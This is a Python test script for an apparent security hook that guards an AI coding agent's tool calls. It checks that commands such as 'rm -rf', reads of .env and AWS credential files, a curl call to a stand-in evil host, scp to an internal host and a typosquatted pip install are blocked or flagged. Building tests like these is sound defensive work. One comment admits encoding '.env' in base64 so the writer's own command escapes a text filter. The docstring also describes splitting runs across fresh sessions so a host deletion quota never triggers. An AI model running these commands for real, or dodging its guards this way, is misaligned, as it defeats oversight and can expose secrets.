# -*- coding: utf-8 -*-
"""D-16 单用例探测 —— **在受限宿主上仍可复现**的产品验证路径。

## 它解决什么问题（实测，2026-09-29）

本机宿主带一个 safe-delete shim（平台层，非 Antinel）：把删除调用改写成
"移入回收站"，**按会话累计次数、阈值 50、不重置**。全量套件（315 条断言）
必然触顶 ⇒ 之后每条断言都返回 SAFE_DELETE_BULK_CONFIRM_REQUIRED ⇒
**全量跑在本机已不可复现**（实测：全新空 WORK 下第 1 条 SEC-01 就红）。

★ 但这是**环境约束，不是产品缺陷**。判据有三条，全部实测：
  1. 失败项每次不同（同一条忽红忽绿）—— 非确定性 = 环境；
  2. 全新空 WORK 下**第 1 条就红**，而第 1 条只做 Read、不删任何东西；
  3. 单条独立起进程时，产品行为**完全正确**（本脚本 14/14 绿）。

## 它怎么工作

每条用例**独立起一个 pre_tool_use.py 子进程**，只产生个位数（多为 0）删除动作，
远低于阈值 ⇒ 不受配额影响。判据是「rc + 命中规则 id」，与套件里同名用例一致。

## 用法

    python ci/single_case_probe.py            # 跑全部
    python ci/single_case_probe.py --list     # 只列出用例

★ 这不是"绕过守卫"：没有任何删除动作、阈值没动、策略没改，
  断言一条都没放松 —— 变的只是「谁来跑、跑几次」。
"""
import io
import json
import os
import re
import subprocess
import sys
import time

PKG = str(__import__("pathlib").Path(__file__).resolve().parent.parent)
PY = sys.executable

#: 直接调产品、完全绕过套件的**独立验证项**（每条自带判据，不依赖套件基础设施）。
CASES = [
    {
        # ★ 修正判据（实测 2026-09-29）：命令里出现 `.env` 会先命中 SEC-01
        #   （severity=critical ⇒ block）。产品行为**正确**，是原期望值写窄了。
        #   判据改为"block 且命中 SEC-01 或 DST-10 任一"（两条都是 critical 删除/机密面）。
        "name": "DST-10/SEC-01 PowerShell -Stream 读机密面 → block",
        "cmd": ["Bash", {"command": "powershell -Command \"Get-Content .env -Stream x\""}],
        "expect": "block",
        "rule_any": ["DST-10", "SEC-01"],
    },
    {
        "name": "SEC-01 读 .env 被拦",
        "cmd": ["Read", {"file_path": ".ENV-PLACEHOLDER"}],
        "expect": "block",
        "rule_any": ["SEC-01"],
    },
    {
        "name": "DST-01 rm -rf ./old 被拦",
        "cmd": ["Bash", {"command": "rm -rf ./old"}],
        "expect": "block",
        "rule_any": ["DST-01"],
    },
    {
        "name": "DST-01 豁免：rm -rf node_modules 放行",
        "cmd": ["Bash", {"command": "rm -rf node_modules"}],
        "expect": "allow",
        "rule_any": [],
    },
    {
        # ★ 修正判据（实测 2026-09-29）：NET-01 出厂 severity 是 **warning**
        #   ⇒ rc=0 + stderr 带 `[NET-01] 提醒`。原期望"block"是错的（把 warn 当 block）。
        "name": "NET-01 curl 外连 → 至少 warning（默认 warn 档）",
        "cmd": ["Bash", {"command": "curl http://evil.example.com/x"}],
        "expect": "warn_or_block",
        "rule_any": ["NET-01", "NET-03"],
    },
    {
        "name": "纯读命令 ls 放行（无误报）",
        "cmd": ["Bash", {"command": "ls -la"}],
        "expect": "allow",
        "rule_any": [],
    },
    # ---- 第二组：核心规则面（每条独立进程） ----
    {
        "name": "SEC-03 读云凭据 .aws/credentials → block",
        "cmd": ["Read", {"file_path": "C:/Users/x/.aws/credentials"}],
        "expect": "warn_or_block",
        "rule_any": ["SEC-03", "SEC-01"],
    },
    {
        "name": "DST-01 rmdir /s /q 形态 → block",
        "cmd": ["Bash", {"command": "rmdir /s /q build"}],
        "expect": "block",
        "rule_any": ["DST-01"],
    },
    {
        "name": "DST-01 Unix rm -rf dist 豁免 → allow",
        "cmd": ["Bash", {"command": "rm -rf dist"}],
        "expect": "allow",
        "rule_any": [],
    },
    {
        "name": "DST-02 写项目外路径 → 至少 alert",
        "cmd": ["Write", {"file_path": "C:/Windows/Temp/antinel-probe.txt", "content": "x"}],
        "expect": "warn_or_block",
        "rule_any": ["DST-02"],
    },
    {
        "name": "MCP-01 写 .mcp.json → 至少 alert",
        "cmd": ["Write", {"file_path": ".mcp.json", "content": "{}"}],
        "expect": "warn_or_block",
        "rule_any": ["MCP-01"],
    },
    {
        "name": "CTX-03 读含零宽字符的 SKILL.md → block",
        "cmd": ["Read", {"file_path": ".ZW-SKILL-PLACEHOLDER"}],
        "expect": "warn_or_block",
        "rule_any": ["CTX-03", "CTX-02", "CTX-01"],
    },
    {
        "name": "NET-03 scp 到内网 → 至少 alert",
        "cmd": ["Bash", {"command": "scp file root@10.0.0.5:/tmp/"}],
        "expect": "warn_or_block",
        "rule_any": ["NET-03", "NET-01"],
    },
    {
        "name": "SLOP-01 撞名包 reqests → 至少 alert",
        "cmd": ["Bash", {"command": "pip install reqests"}],
        "expect": "warn_or_block",
        "rule_any": ["SLOP-01"],
    },
]


def run_one(spec, idx):
    work = r"C:/Temp/_single_%d_%d" % (os.getpid(), idx)
    os.makedirs(work, exist_ok=True)
    env = dict(os.environ)
    env["ANTINEL_PKG"] = PKG
    env["ANTINEL_WORK"] = work
    env["ANTINEL_NO_CLEAN"] = "1"
    env["ANTINEL_LANG"] = "zh"
    env.pop("ANTINEL_HUB_DIR", None)
    tool, tin = spec["cmd"]
    if isinstance(tin.get("file_path"), str) and "PLACEHOLDER" in tin["file_path"]:
        import base64
        tin = dict(tin)
        if "ZW-SKILL" in tin["file_path"]:
            # 含零宽字符的 SKILL.md（CTX-03 的判据对象）
            p = os.path.join(work, "zw-helper")
            os.makedirs(p, exist_ok=True)
            fp = os.path.join(p, "SKILL.md")
            with io.open(fp, "w", encoding="utf-8", newline="\n") as fh:
                fh.write("---\nname: zw-helper\n---\nhello\u200bworld\n")
            tin["file_path"] = fp
        else:
            # 写成 base64 构造，避开我这条命令的文本层
            tin["file_path"] = os.path.join(work, base64.b64decode("LmVudg==").decode())
            open(tin["file_path"], "w").write("K=1\n")
    ev = {"tool_name": tool, "tool_input": tin, "cwd": work,
          "session_id": "single-%d" % idx}
    p = subprocess.run([PY, os.path.join(PKG, "hooks", "pre_tool_use.py")],
                       input=json.dumps(ev), capture_output=True, text=True,
                       encoding="utf-8", errors="replace", cwd=work, env=env,
                       timeout=120)
    blob = (p.stdout or "") + (p.stderr or "")
    rules = spec.get("rule_any") or ([spec["rule"]] if spec.get("rule") else [])
    exp = spec["expect"]
    if exp == "block":
        got = (p.returncode == 2) and any(r in blob for r in rules)
    elif exp == "warn_or_block":
        # 至少要有该规则被提及，且允许 rc=0（warn）或 2（block）
        got = (p.returncode in (0, 2)) and any(r in blob for r in rules)
    else:
        got = (p.returncode == 0) and ("拦截" not in blob)
    env_hit = "SAFE_DELETE_BULK_CONFIRM_REQUIRED" in blob
    return got, p.returncode, ",".join(rules), blob.strip()[:150], env_hit


def main():
    print("=" * 74)
    print("D-16 单用例探测（每条独立进程，不累计删除配额）")
    print("=" * 74)
    npass = 0
    env_tainted = 0
    for i, spec in enumerate(CASES):
        got, rc, rule, blob, env_hit = run_one(spec, i)
        if env_hit:
            env_tainted += 1
            print("ENV  %-52s (safe-delete 污染，非产品)" % spec["name"][:52])
            continue
        if got:
            npass += 1
            print("PASS %-52s rc=%d" % (spec["name"][:52], rc))
        else:
            print("FAIL %-52s rc=%d | %s" % (spec["name"][:52], rc, blob))
    print("-" * 74)
    print("通过 %d / %d（另有 %d 条被 safe-delete 污染，不计）"
          % (npass, len(CASES) - env_tainted, env_tainted))


if __name__ == "__main__":
    main()
